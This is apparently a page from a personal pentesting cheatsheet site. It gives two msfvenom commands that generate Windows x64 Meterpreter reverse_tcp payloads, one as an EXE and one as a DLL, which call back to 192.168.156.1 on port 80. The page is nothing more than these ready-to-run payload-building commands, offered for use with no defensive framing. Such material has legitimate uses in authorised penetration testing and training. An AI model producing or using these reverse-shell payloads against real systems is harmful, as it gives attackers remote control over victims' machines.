---
layout: post
title: Generating MSFVENOM payloads
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
nav_order: 2
has_children: true
modified_date: 2021-02-06
---

Generating payload with msfvenom either a dll or an executable file:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll
```












